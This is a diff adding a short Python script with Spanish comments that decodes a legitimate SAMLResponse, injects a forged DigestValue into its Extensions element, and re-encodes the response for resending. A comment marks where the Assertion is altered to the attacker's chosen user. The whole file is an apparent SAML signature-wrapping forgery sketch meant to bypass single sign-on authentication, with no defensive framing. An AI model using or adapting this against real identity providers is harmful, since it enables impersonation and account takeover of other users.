@@ -1,0 +1,15 @@
+from lxml import etree
+import base64
+
+# se parsea un SAMLResponse legítimo
+xml = etree.fromstring(base64.b64decode(orig_response))
+# creado nuevo DigestValue
+fake = etree.Element("{http://www.w3.org/2000/09/xmldsig#}DigestValue")
+fake.text = base64.b64encode(b"fake-digest").decode()
+# insert en extensiones
+ext = xml.find(".//{*}Extensions")
+ext.insert(0, fake)
+# modificar Assertion para usuario deseado...
+# luego reserializar y reenviar
+patched = base64.b64encode(etree.tostring(xml))
+print(patched.decode())
